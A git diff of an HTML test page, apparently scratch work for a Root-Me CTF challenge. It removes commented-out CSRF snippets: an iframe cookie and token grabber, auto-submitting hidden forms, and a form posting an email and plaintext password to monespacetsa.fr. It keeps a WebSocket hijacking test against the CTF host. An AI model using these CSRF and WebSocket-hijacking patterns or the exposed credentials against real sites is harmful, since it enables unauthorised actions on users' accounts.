@@ -5,52 +5,21 @@
   <meta charset="utf-8">
   <title>Titre de la page</title>
   <script src="https://unpkg.com/axios@1.1.2/dist/axios.min.js"></script>
-  <script src="script.js"></script>
 </head>
 
 <body>
   <h1>test</h1>
-  <!-- <script charset="utf-8">
-    function setTokenAndSend(token){
-        document.getElementsByName("user_token")[0].value = token
-        document.getElementById("csrf_form").submit();
-    }
-    function getToken(){
-        var iframe = document.getElementById("iframe");
-        var doc = iframe.contentDocument ? iframe.contentDocument: iframe.contentWindow.document;
-        // var token = doc.getElementsByName("user_token")[0].value;
-        var cookie = document.getElementById("iframe").contentDocument.cookie
-        console.log(cookie)
-        // setTokenAndSend(token)
-    }
-    </script>
-    <iframe id="iframe" onload="javascript:getToken();" src="http://ctf15.root-me.org/" ></iframe> -->
-    <!-- <form id="csrf_form" action="http://example.com/user/update/" enctype="text/plain" method="POST">
-        <input name="username" type="hidden" value="0xffsec" />
-        <input name="user_token" type="hidden" value="set_by_js" />
-    </form> -->
   <script>
     setTimeout(() => {
       var ws = new WebSocket('ws://ctf15.root-me.org/ws');
-      ws.onopen = function() {
-          ws.send("hello");
+      ws.onopen = function () {
+        ws.send("hello");
       };
-      ws.onmessage = function(event) {
+      ws.onmessage = function (event) {
         console.log(event);
       };
     }, 1000)
   </script>
-  <!-- <form action="https://monespacetsa.fr/api/signin" method="post"> -->
-    <!-- <input type="hidden" name="subject" value="test5" />
-    <input type="hidden" name="content" value="salut je suis un test" /> -->
-    <!-- <input type="hidden" name="email" value="monespacetsaandco@gmail.com" />
-    <input type="hidden" name="password" value="GXBAOAV.D;G}~1Vxx@BYPWsryb;loaU0e[g" />
-    <button type="submit">oui</button>
-  </form> -->
-  
-  <!-- <script>
-    document.forms[0].submit();
-  </script> -->
 </body>
 
 </html>
